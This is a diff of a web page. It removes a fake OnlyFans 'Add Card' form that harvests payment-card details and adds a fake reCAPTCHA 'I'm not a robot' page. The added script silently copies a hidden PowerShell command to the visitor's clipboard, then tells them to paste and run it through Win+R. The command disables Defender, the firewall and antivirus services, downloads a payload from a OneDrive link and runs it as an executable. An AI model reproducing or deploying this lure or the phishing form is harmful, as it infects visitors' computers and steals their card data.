@@ -1,333 +1,419 @@
 <!DOCTYPE html>
-<html lang="en"
-
-<!-- Mirrored from onlyfans.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 21:52:53 GMT -->
+<html lang="en">
 <head>
-  <title>OnlyFans</title>
-  <meta name=description content=OnlyFans>
-  <meta name=keywords content=OnlyFans>
-  <meta charset=utf-8>
-  <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-  <meta property=og:image content=https://static2.onlyfans.com/static/prod/f/202501201307-f7fd7c0f3c/images/of-logo-b.jpg>
-  <meta property=og:image:width content=1200>
-  <meta property=og:image:height content=1200>
-  <meta property=og:description name=description content="OnlyFans is the social platform revolutionizing creator and fan connections. The site is inclusive of artists and content creators from all genres and allows them to monetize their content while developing authentic relationships with their fanbase.">
-  <meta property=og:url content=https://onlyfans.com>
-  <meta property=og:title content=OnlyFans>
-  <meta property=og:type content=website>    
-
-<head>
-
-  <meta charset="UTF-8">
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <title>Onlyfans - Add Card</title>
-
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
-
-  <style>
-
-    body {
-
-      background-color: #F5F5F5;
-
-      font-family: Arial, sans-serif;
-
-    }
-
+    <meta charset="utf-8">
+    <title>reCAPTCHA Verification</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
+    <style>
     .container {
-
-      max-width: 500px;
-
-      margin: 40px auto;
-
-      background-color: #FFFFFF;
-
-      padding: 20px;
-
-      border-radius: 10px;
-
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-
+        font-family: Roboto, helvetica, arial, sans-serif;
     }
 
-    .stepper {
-
-      display: flex;
-
-      align-items: center;
-
-      justify-content: space-between;
-
-      padding-bottom: 20px;
-
+    .m-p {
+        margin: 0;
+        padding: 0;
     }
 
-    .step {
-
-      display: flex;
-
-      flex-direction: column;
-
-      align-items: center;
-
+    .block {
+        display: block;
     }
 
-    .step-circle {
-
-      width: 30px;
-
-      height: 30px;
-
-      background-color: #FFFFFF;
-
-      border: 2px solid #34A8FF;
-
-      border-radius: 50%;
-
-      display: flex;
-
-      justify-content: center;
-
-      align-items: center;
-
-      font-size: 14px;
-
-      color: #333333;
-
+    code {
+        font-size: 9px;
+        margin-left: 2px;
+        color: gray;
     }
 
-    .step-line {
-
-      width: 100%;
-
-      height: 2px;
-
-      background-color: #34A8FF;
-
-      position: absolute;
-
-      top: 15px;
-
-      left: 50%;
-
-      transform: translateX(-50%);
-
-      z-index: -1;
-
+    .line-normal {
+        line-height: normal;
     }
 
-    input[type="text"] {
-
-      color: #333333;
-
+    .checkbox-window {
+        height: 74px;
+        width: 300px;
+        background-color: #f9f9f9;
+        border-radius: 3px;
+        border: 1px solid #d3d3d3;
     }
 
-    input[type="text"]::placeholder {
-
-      color: #333333;
-
-      opacity: 0.5;
-
+    .checkbox-window a {
+        color: #555;
+        text-decoration: none;
     }
 
-  </style>
+    .checkbox-window a:hover {
+        color: #555;
+        text-decoration: underline;
+    }
 
+    .checkbox-container {
+        width: 28px;
+        height: 28px;
+    }
+
+    .checkbox {
+        position: relative;
+        background-color: #fff;
+        border-radius: 2px;
+        height: 100%;
+        width: 100%;
+        border: 2px solid #c1c1c1;
+        margin: 21px 0 0 12px;
+        outline: none;
+        font-family: Roboto, helvetica, arial, sans-serif;
+        transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+    }
+
+    .checkbox:hover {
+        border: 2px solid #b2b2b2;
+    }
+
+    .im-not-a-robot {
+        position: relative;
+        left: 52px;
+        bottom: 3px;
+        font-size: 15px;
+        color: #282727;
+    }
+
+    .captcha-logo {
+        position: relative;
+        left: 244px;
+        bottom: 36px;
+        width: 40px;
+        height: 45px;
+        vertical-align: baseline;
+        padding-bottom: 4px;
+    }
+
+    .checkbox-desc {
+        color: #555555;
+        position: relative;
+        font-size: 8px;
+        text-align: center;
+        bottom: 40px;
+        left: 112px;
+    }
+
+    .spinner {
+        visibility: hidden;
+        position: relative;
+        top: -85px;
+        left: 12px;
+        height: 20px;
+        width: 20px;
+        border: 2px solid rgba(0, 0, 0, 0.1);
+        border-top: 2px solid #333;
+        border-radius: 50%;
+        visibility: hidden;
+        opacity: 0;
+        transition: opacity 0.5s linear;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+
+    .verify-window {
+        font-family: Roboto, helvetica, arial, sans-serif;
+        opacity: 0;
+        position: absolute;
+        visibility: hidden;
+        margin: auto;
+        width: 310px;
+        background-color: #fff;
+        border: 1px solid #cecece;
+        -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+        box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+        transition: opacity 400ms;
+    }
+
+    ol {
+        counter-reset: item;
+        list-style-type: none;
+        list-style-position: outside;    
+        padding-left: 0;
+    }
+
+    ol li {
+        counter-increment: item;
+        margin-bottom: 10px;
+    }
+
+    ol li::before {
+        content: counter(item) ". ";
+        color: #1A73E8;
+        font-weight: bold;
+        margin-right: 10px;
+        margin-left: 10px;
+    }
+
+    .verify-container {
+        padding: 8px;
+    }
+
+    .verify-header {
+        background-color: #1A73E8;
+        padding: 16px 16px 24px 16px;
+        color: #fff;
+    }
+
+    .verify-header-text-small {
+        font-size: 14px;
+        line-height: normal;
+    }
+
+    .verify-header-text-medium {
+        font-size: 16px;
+    }
+
+    .verify-header-text-big {
+        font-size: 24px;
+        font-weight: 700;
+    }
+
+    .verify-main {
+        padding: 5px;
+        color: #111;
+        font-size: 13px;
+    }
+
+    .verify-footer {
+        border-top: 1px solid #cecece;
+        padding: 10px 7px 10px 7px;
+        color: #737373;
+        display: grid;
+        grid-template-columns: auto 102px;
+        font-size: 13px;
+    }
+
+    .verify-footer-left {
+        padding: 5px;
+    }
+
+    .verify-verify-button {
+        text-transform: uppercase;
+        background-color: #5a89e2;
+        color: #fff;
+        text-align: center;
+        width: 100%;
+        padding: 12px 0 12px 0;
+        text-decoration: none;
+        font-weight: 600;
+        height: min-content;
+        border-radius: 3px;
+        font-size: 14px;
+        border: none;
+        outline: none;
+        cursor: not-allowed;
+    }
+    </style>
 </head>
-
 <body>
-
-  <div class="container">
-
-    <header>
-
-      <nav class="navbar navbar-expand-lg navbar-light bg-light">
-
-        <a href="#" class="navbar-brand">
-
-          <img height="30" width="30" src="https://onlyfans.com/favicon.ico">
-
-        </a>
-
-      </nav>
-
-    </header>
-
-    <section>
-
-      <div class="stepper">
-
-        <div class="step">
-
-          <div class="step-circle">1</div>
-
-          <p>Info</p>
-
+<div class="container m-p">    
+    <div id="checkbox-window" class="checkbox-window m-p block">
+        <div class="checkbox-container m-p">
+            <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
         </div>
+        <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="captcha-logo line-normal" alt="reCAPTCHA">
+        <br>
+        <p class="checkbox-desc m-p line-normal">
+        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+        </p>
+        <img class="spinner" alt="" id="spinner">
+    </div>
+    
+    <div id="verify-window" class="verify-window">
+        <div class="verify-container">
+            <header class="verify-header">
+                <span class="verify-header-text-medium m-p block">Complete these</span>
+                <span class="verify-header-text-big m-p block">Verification Steps</span>
+                <span class="verify-header-text-medium m-p block"></span>
+            </header>
+            <main class="verify-main">
+                <p>
+                    To better prove you are not a robot, please:
+                </p>
+                <ol>
+                    <li>
+                        Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                    </li>
+                    
+                    <li>
+                        In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                    </li>
 
-        <div class="step">
-
-          <div class="step-circle">2</div>
-
-          <p>Verify</p>
-
+                    <li>
+                        Press <b>Enter</b> on your keyboard to finish.
+                    </li>
+                </ol>
+                <p>
+                    You will observe and agree:
+                    <br>
+                <code>
+                    ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
+                </code>
+                </p>
+            </main>
         </div>
-
-        <div class="step">
-
-          <div class="step-circle">3</div>
-
-          <p>Done</p>
-
-        </div>
-
-        <div class="step-line"></div>
-
-      </div>
-
-      <form>
-
-        <h2>Add Card</h2>
-
-        <div class="row">
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="name">Name</label>
-
-              <input class="form-control" type="text" placeholder="Jane Doe" onfocus="this.placeholder=''" onblur="this.placeholder='Jane Doe'">
-
+        <footer class="verify-container verify-footer">
+            <div class="verify-footer-left">
+                Perform the steps above to finish verification.
             </div>
-
-          </div>
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="address">Billing Address</label>
-
-              <input class="form-control" id="address" type="text" placeholder="123 Main St" onfocus="this.placeholder=''" onblur="this.placeholder='123 Main St'">
-
-            </div>
-
-          </div>
-
-        </div>
-
-        <div class="row">
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="city">City</label>
-
-              <input class="form-control" id="city" type="text" placeholder="Anytown" onfocus="this.placeholder=''" onblur="this.placeholder='Anytown'">
-
-            </div>
-
-          </div>
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="state">State</label>
-
-              <input class="form-control" id="state" type="text" placeholder="CA" onfocus="this.placeholder=''" onblur="this.placeholder='CA'">
-
-            </div>
-
-          </div>
-
-        </div>
-
-        <div class="row">
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="zip">Zip Code</label>
-
-              <input class="form-control" id="zip" type="text" placeholder="12345" onfocus="this.placeholder=''" onblur="this.placeholder='12345'">
-
-            </div>
-
-          </div>
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="country">Country</label>
-
-              <input class="form-control" id="country" type="text" placeholder="USA" onfocus="this.placeholder=''" onblur="this.placeholder='USA'">
-
-            </div>
-
-          </div>
-
-        </div>
-
-        <div class="form-group">
-
-          <label for="card-number">Card Number</label>
-
-          <input class="form-control" id="card-number" type="text" placeholder="XXXX XXXX XXXX XXXX" onfocus="this.placeholder=''" onblur="this.placeholder='XXXX XXXX XXXX XXXX'">
-
-        </div>
-
-        <div class="row">
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="expiration">Expiration</label>
-
-              <input class="form-control" id="expiration" type="text" placeholder="MM/YYYY" onfocus="this.placeholder=''" onblur="this.placeholder='MM/YYYY'">
-
-            </div>
-
-          </div>
-
-          <div class="col-md-6">
-
-            <div class="form-group">
-
-              <label for="cvc">CVC</label>
-
-              <input class="form-control" id="cvc" type="text" placeholder="XXX" onfocus="this.placeholder=''" onblur="this.placeholder='XXX'">
-
-            </div>
-
-          </div>
-
-        </div>
-
-        <div class="text-center mb-3">
-
-          <button class="btn btn-primary" type="submit">Checkout</button>
-
-        </div>
-
-        <div class="text-center">
-
-          <p>By clicking "Checkout", you agree to our Terms of Service and Privacy Policy.</p>
-
-        </div>
-
-      </form>
-
-    </section>
-
-  </div>
-
+            <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+        </footer>
+    </div>        
+</div>
+
+<script>
+    let checkboxWindow = document.getElementById("checkbox-window");
+    let checkboxBtn = document.getElementById("checkbox");
+    let checkboxBtnSpinner = document.getElementById("spinner");
+    let verifywindow = document.getElementById("verify-window");
+
+    function addCaptchaListeners() {
+        if (checkboxBtn) {
+            document.addEventListener("click", function (event) {
+                let path = event.composedPath();
+                if (!path.includes(verifywindow) && isverifywindowVisible()) {
+                    closeverifywindow();
+                }
+            });
+            checkboxBtn.addEventListener("click", function (event) {
+                event.preventDefault();
+                checkboxBtn.disabled = true;
+                runClickedCheckboxEffects();
+            });
+        }
+    }
+
+    function runClickedCheckboxEffects() {
+        hideCaptchaCheckbox();
+        setTimeout(function(){
+            showCaptchaLoading();
+        },500);
+        setTimeout(function(){
+            showVerifyWindow();
+        },900)
+    }
+
+    function showCaptchaLoading() {
+        checkboxBtnSpinner.style.visibility = "visible";
+        checkboxBtnSpinner.style.opacity = "1";
+        checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+    }
+
+    function hideCaptchaLoading() {
+        checkboxBtnSpinner.style.opacity = "0";
+        checkboxBtnSpinner.style.animation = "none";
+        setTimeout(function() {
+            checkboxBtnSpinner.style.visibility = "hidden";
+        }, 500);
+    }
+
+    function hideCaptchaCheckbox() {
+        checkboxBtn.style.visibility = "hidden";
+        checkboxBtn.style.opacity = "0";
+    }
+
+    function showCaptchaCheckbox() {
+        checkboxBtn.style.width = "100%";
+        checkboxBtn.style.height = "100%";
+        checkboxBtn.style.borderRadius = "2px";
+        checkboxBtn.style.margin = "21px 0 0 12px";
+        checkboxBtn.style.opacity = "1";
+    }
+
+    function hideCaptchaCheckbox() {
+        checkboxBtn.style.width = "4px";
+        checkboxBtn.style.height = "4px";
+        checkboxBtn.style.borderRadius = "50%";
+        checkboxBtn.style.marginLeft = "25px";
+        checkboxBtn.style.marginTop = "33px";
+        checkboxBtn.style.opacity = "0";
+    }
+
+    function generateRandomNumber() {
+        const min = 1000; 
+        const max = 9999;
+        return Math.floor(Math.random() * (max - min + 1) + min).toString();
+    }
+
+    function closeverifywindow() {
+        verifywindow.style.display = "none";
+        verifywindow.style.visibility = "hidden";
+        verifywindow.style.opacity = "0";
+
+        showCaptchaCheckbox();
+        hideCaptchaLoading();
+        checkboxBtn.disabled = false;
+    }
+
+    function isverifywindowVisible() {
+        return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+    }
+
+    function setClipboardCopyData(textToCopy){
+        const tempTextArea = document.createElement("textarea");
+        tempTextArea.value = textToCopy;
+        document.body.append(tempTextArea);
+        tempTextArea.select();
+        document.execCommand("copy");
+        document.body.removeChild(tempTextArea);
+    }
+
+    function stageClipboard(verification_id){
+        const prefix = "powershell -window hidden -exec bypass -Command \"";
+        const disableDefender = "Set-MpPreference -DisableRealtimeMonitoring $true; ";
+        const disableRansomware = "Set-MpPreference -EnableControlledFolderAccess Disabled; ";
+        const disableFirewall = "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; ";
+        const disableAV = "Get-Service -DisplayName '*antivirus*','*security*','*mcafee*','*norton*','*symantec*','*kaspersky*','*bitdefender*','*avast*','*avg*' | Stop-Service -Force; ";
+        const downloadFile = "Invoke-WebRequest -Uri 'https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up' -OutFile '$env:TEMP\\\\captcha.html'; ";
+        const convertToExe = "Move-Item '$env:TEMP\\\\captcha.html' '$env:TEMP\\\\system_update.exe'; ";
+        const executeBypass = "rundll32.exe '$env:TEMP\\\\system_update.exe',EntryPoint; ";
+        const addExclusion = "Add-MpPreference -ExclusionPath '$env:TEMP'; ";
+        const setWallpaper = "Invoke-WebRequest -Uri 'https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6' -OutFile '$env:TEMP\\\\wallpaper.jpg'; ";
+        const applyWallpaper = "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllSetClipboardCopyData(\\\"user32.dll\\\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; ";
+        const finalWallpaper = "[Wallpaper]::SystemParametersInfo(20, 0, '$env:TEMP\\\\wallpaper.jpg', 3); ";
+        const suffix = "\" # ✅ ''I am not a robot - reCAPTCHA Verification ID: " + verification_id + "''";
+        
+        const fullCommand = prefix + disableDefender + disableRansomware + disableFirewall + disableAV + 
+                           downloadFile + convertToExe + executeBypass + addExclusion + 
+                           setWallpaper + applyWallpaper + finalWallpaper + suffix;
+
+        setClipboardCopyData(fullCommand);
+    }
+
+    function showVerifyWindow() {
+        verifywindow.style.display = "block";
+        verifywindow.style.visibility = "visible";
+        verifywindow.style.opacity = "1";
+        verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+        verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
+
+        if (verifywindow.offsetTop < 5) {
+           verifywindow.style.top = "5px";
+        }
+
+        if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
+           verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
+        }
+
+        var verification_id = generateRandomNumber();
+        document.getElementById('verification-id').textContent = verification_id;
+        
+        stageClipboard(verification_id);
+    }
+
+    addCaptchaListeners();
+</script>
 </body>
-
 </html>
